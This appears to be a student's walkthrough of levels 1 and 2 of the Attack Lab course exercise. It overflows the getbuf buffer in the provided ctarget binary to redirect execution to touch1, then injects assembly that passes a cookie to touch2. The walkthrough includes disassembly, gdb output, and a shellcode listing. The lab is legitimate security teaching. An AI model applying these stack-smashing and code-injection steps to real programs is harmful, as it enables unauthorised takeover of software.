# Attack Lab

## level 1

1. get assembly code

    ```
    objdump -d ctarget > c.txt
    ```

1. use gdb to run ctarget

    ```
    gdb ctarget
    ```

2. to check the assembly code

    ```
    (gdb) disas getbuf
    Dump of assembler code for function getbuf:
        0x00000000004017a8 <+0>:     sub    $0x28,%rsp
        0x00000000004017ac <+4>:     mov    %rsp,%rdi
        0x00000000004017af <+7>:     callq  0x401a40 <Gets>
        0x00000000004017b4 <+12>:    mov    $0x1,%eax
        0x00000000004017b9 <+17>:    add    $0x28,%rsp
        0x00000000004017bd <+21>:    retq   
    End of assembler dump.
    ```

    This function will get a string of 0x28 bytes (that is, 40 characters), and finally execute the retq command.

3. find address of touch1

    ```
    (gdb)disas touch1
    Dump of assembler code for function touch1:
        0x00000000004017c0 <+0>:     sub    $0x8,%rsp
    ```

4. combine the values to ctarget.1.txt and run

    ```
    ./hex2raw < ctarget.1.txt | ./ctarget -q
    ```

## level 2

1. in assembly code find touch2

    ```
    00000000004017ec <touch2>:
    ```

    We see that touch2 has passed a parameter, and if the value of this parameter is equal to the cookie, it will be successful. The value of the cookie is in the given file cookie.txt, my cookie is 0x59b997fa.

2. assembly code should be

    ```
    movq    $0x59b997fa, %rdi
    pushq   $0x4017ec
    ret
    ```

3. Compile on the command line 

    ```
    gcc -c l2.s
    objdump -d l2.o
    ```

4. find %rsp using gdb

    ```
    gdb ctarget
    (gdb) break *0x4017ac
    (gdb) run -q
    (gdb) info registers
    ... 
    rsp            0x5561dc78	0x5561dc78
    ... 
    ```

5. get the %rsp address, and then write the injection string. The string is the injection code address + useless characters + return address.

